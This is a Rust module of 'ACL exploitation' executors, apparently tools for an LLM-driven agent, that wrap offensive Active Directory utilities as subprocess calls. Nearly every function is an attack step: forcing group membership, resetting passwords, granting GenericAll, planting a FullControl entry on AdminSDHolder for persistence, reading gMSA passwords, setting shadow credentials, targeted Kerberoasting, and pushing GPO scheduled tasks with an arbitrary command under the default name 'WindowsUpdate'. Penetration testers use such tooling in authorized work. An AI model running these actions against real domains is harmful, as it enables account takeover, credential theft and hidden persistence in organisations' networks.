//! ACL exploitation tool executors.
//!
//! Each function takes a JSON `Value` of arguments and returns a `ToolOutput`
//! produced by running the corresponding CLI tool as a subprocess.

use anyhow::Result;
use serde_json::Value;

#[allow(unused_imports)]
use crate::args::optional_i64;
use crate::args::{optional_bool, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Convert a domain name to an LDAP base DN.
///
/// e.g. `"contoso.local"` -> `"DC=contoso,DC=local"`
fn domain_to_base_dn(domain: &str) -> String {
    domain
        .split('.')
        .map(|part| format!("DC={part}"))
        .collect::<Vec<_>>()
        .join(",")
}

// ---------------------------------------------------------------------------
// 1. bloodyAD — add group member
// ---------------------------------------------------------------------------

/// Add a user to a group via `bloodyAD add groupMember`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `group`, `target_user`
pub async fn bloodyad_add_group_member(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let group = required_str(args, "group")?;
    let target_user = required_str(args, "target_user")?;

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg("add")
        .arg("groupMember")
        .arg(group)
        .arg(target_user)
        .timeout_secs(60)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 2. bloodyAD — set password
// ---------------------------------------------------------------------------

/// Set a user's password via `bloodyAD set password`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_user`, `new_password`
pub async fn bloodyad_set_password(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target_user = required_str(args, "target_user")?;
    let new_password = required_str(args, "new_password")?;

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg("set")
        .arg("password")
        .arg(target_user)
        .arg(new_password)
        .timeout_secs(60)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 3. bloodyAD — add GenericAll
// ---------------------------------------------------------------------------

/// Grant GenericAll rights via `bloodyAD add genericAll`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_dn`, `principal`
pub async fn bloodyad_add_genericall(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target_dn = required_str(args, "target_dn")?;
    let principal = required_str(args, "principal")?;

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg("add")
        .arg("genericAll")
        .arg(target_dn)
        .arg(principal)
        .timeout_secs(60)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 4. AdminSDHolder ACE addition
// ---------------------------------------------------------------------------

/// Add an ACL entry to the AdminSDHolder container via `bloodyAD add aclEntry`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `principal`
/// Optional args: `right` (default: `"FullControl"`)
pub async fn adminsd_holder_add_ace(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let principal = required_str(args, "principal")?;
    let right = optional_str(args, "right").unwrap_or("FullControl");

    let base_dn = domain_to_base_dn(domain);
    let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg("add")
        .arg("aclEntry")
        .arg(&adminsd_dn)
        .arg(principal)
        .arg(right)
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 5. gMSA password read via bloodyAD
// ---------------------------------------------------------------------------

/// Read a gMSA account's managed password via `bloodyAD get object`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `gmsa_account`
pub async fn gmsa_read_password_bloodyad(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let gmsa_account = required_str(args, "gmsa_account")?;

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg("get")
        .arg("object")
        .arg(gmsa_account)
        .arg("--attr")
        .arg("msDS-ManagedPassword")
        .timeout_secs(60)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 6. pywhisker — Shadow Credentials
// ---------------------------------------------------------------------------

/// Manipulate msDS-KeyCredentialLink via `pywhisker.py`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_samaccountname`
/// Optional args: `action` (default: `"list"`)
pub async fn pywhisker(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target_sam = required_str(args, "target_samaccountname")?;
    let action = optional_str(args, "action").unwrap_or("list");

    CommandBuilder::new("pywhisker")
        .flag("-d", domain)
        .flag("-u", username)
        .flag("-p", password)
        .flag("--target", target_sam)
        .flag("--action", action)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 7. Targeted Kerberoast
// ---------------------------------------------------------------------------

/// Perform targeted Kerberoasting via `targetedKerberoast.py`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_user`
pub async fn targeted_kerberoast(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target_user = required_str(args, "target_user")?;

    CommandBuilder::new("targetedKerberoast.py")
        .flag("-d", domain)
        .flag("-u", username)
        .flag("-p", password)
        .flag("-t", target_user)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 8. SharpGPOAbuse
// ---------------------------------------------------------------------------

/// Abuse Group Policy Objects via `SharpGPOAbuse.exe` (run through mono on Linux).
///
/// Required args: `gpo_name`, `domain`, `username`, `password`, `dc_ip`, `user_to_add`
/// Optional args: `action` (default: `"AddLocalAdmin"`), `computer_target`
pub async fn sharpgpoabuse(args: &Value) -> Result<ToolOutput> {
    let gpo_name = required_str(args, "gpo_name")?;
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    // SharpGPOAbuse uses integrated auth via domain/DC — password is required
    // by the LLM schema for credential consistency but not passed to the binary.
    let _password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let user_to_add = optional_str(args, "user_to_add").unwrap_or(username);
    let action = optional_str(args, "action").unwrap_or("AddLocalAdmin");
    let computer_target = optional_str(args, "computer_target");

    let action_flag = format!("--{action}");

    CommandBuilder::new("mono")
        .arg("SharpGPOAbuse.exe")
        .arg(&action_flag)
        .flag("--UserAccount", user_to_add)
        .flag("--GPOName", gpo_name)
        .flag("--Domain", domain)
        .flag("--DomainController", dc_ip)
        .flag_opt("--ComputerTarget", computer_target)
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 9. pygpoabuse — GPO immediate task
// ---------------------------------------------------------------------------

/// Create an immediate scheduled task via GPO abuse with `pygpoabuse`.
///
/// Required args: `domain`, `username`, `password`, `gpo_id`, `command`, `dc_ip`
/// Optional args: `task_name`, `force` (bool)
pub async fn pygpoabuse_immediate_task(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let gpo_id = required_str(args, "gpo_id")?;
    let command = required_str(args, "command")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let task_name = optional_str(args, "task_name").unwrap_or("WindowsUpdate");
    let force = optional_bool(args, "force").unwrap_or(true);

    let target = credentials::impacket_target(Some(domain), username, Some(password), domain);

    CommandBuilder::new("pygpoabuse")
        .arg(&target)
        .flag("-gpo-id", gpo_id)
        .flag("-command", command)
        .flag("-taskname", task_name)
        .flag("-dc-ip", dc_ip)
        .arg_if(force, "-f")
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 10. dacledit — DACL editing
// ---------------------------------------------------------------------------

/// Edit DACLs via `dacledit.py`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `principal`, `rights`, `target_dn`
/// Optional args: `action` (default: `"write"`)
pub async fn dacl_edit(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let principal = required_str(args, "principal")?;
    let rights = required_str(args, "rights")?;
    let target_dn = required_str(args, "target_dn")?;
    let action = optional_str(args, "action").unwrap_or("write");

    let target = credentials::impacket_target(Some(domain), username, Some(password), domain);

    CommandBuilder::new("dacledit.py")
        .flag("-action", action)
        .flag("-principal", principal)
        .flag("-rights", rights)
        .flag("-target-dn", target_dn)
        .arg(&target)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_domain_to_base_dn_simple() {
        assert_eq!(domain_to_base_dn("contoso.local"), "DC=contoso,DC=local");
    }

    #[test]
    fn test_domain_to_base_dn_nested() {
        assert_eq!(
            domain_to_base_dn("north.contoso.local"),
            "DC=north,DC=contoso,DC=local"
        );
    }

    #[test]
    fn test_domain_to_base_dn_single() {
        assert_eq!(domain_to_base_dn("local"), "DC=local");
    }

    #[test]
    fn test_adminsd_holder_dn_format() {
        let domain = "contoso.local";
        let base_dn = domain_to_base_dn(domain);
        let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");
        assert_eq!(adminsd_dn, "CN=AdminSDHolder,CN=System,DC=contoso,DC=local");
    }
}
